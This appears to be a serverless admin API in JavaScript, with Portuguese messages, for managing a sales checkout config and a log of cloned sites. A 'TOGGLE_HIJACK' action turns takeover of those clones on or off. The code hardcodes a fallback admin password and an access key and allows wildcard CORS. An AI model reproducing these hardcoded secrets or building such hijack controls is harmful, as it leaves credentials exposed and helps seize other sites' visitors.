import { supabase } from './supabase.js';

export default async function handler(req, res) {
  // CORS configuration
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();

  // Robust Body Parsing (fixes the "Acesso Negado" issue in some environments)
  let body = req.body;
  if (typeof body === 'string') {
    try {
      body = JSON.parse(body);
    } catch (e) {
      console.error('JSON Parse Error in Core Agent:', e);
    }
  }

  const { password, action, payload } = body || {};

  // AUTH: Senha configurada via Variável de Ambiente ou Padrão Disfarçado
  const ADMIN_PASS = process.env.ADMIN_PASSWORD || 'dr-apex-core@26';
  
  if (password !== ADMIN_PASS) {
    // Hardened error response
    return res.status(401).json({ error: 'Acesso Restrito: Protocolo de Segurança Ativo' });
  }

  try {
    if (action === 'GET_CONFIG') {
      const { data: configData } = await supabase
        .from('apex_config')
        .select('value')
        .eq('key', 'main_config')
        .single();

      const { data: logsData } = await supabase
        .from('apex_clones_log')
        .select('id, domain, path, last_seen, original_link, hijack_active')
        .order('last_seen', { ascending: false })
        .limit(50);

      const config = configData?.value || {
        checkout_url: 'https://lastlink.com/p/CAA303628/checkout-payment/',
        access_key: 'apex_vip_access_2026_secure',
        official_domain: ''
      };

      return res.status(200).json({ config, logs: logsData || [] });

    } else if (action === 'TOGGLE_HIJACK') {
      const { id, status } = payload;
      const { error } = await supabase
        .from('apex_clones_log')
        .update({ hijack_active: status })
        .eq('id', id);

      if (error) throw error;
      return res.status(200).json({ success: true, message: `Status de Sequestro Atualizado` });

    } else if (action === 'UPDATE_CONFIG') {
      const { error } = await supabase
        .from('apex_config')
        .upsert({ key: 'main_config', value: payload, updated_at: new Date() });

      if (error) throw error;
      return res.status(200).json({ success: true, message: 'Configurações Globais Sincronizadas' });
    }

    return res.status(400).json({ error: 'Comando Não Reconhecido' });
  } catch (err) {
    console.error('Agent Error:', err);
    return res.status(500).json({ error: 'Erro de Comunicação com a Base de Dados' });
  }
}
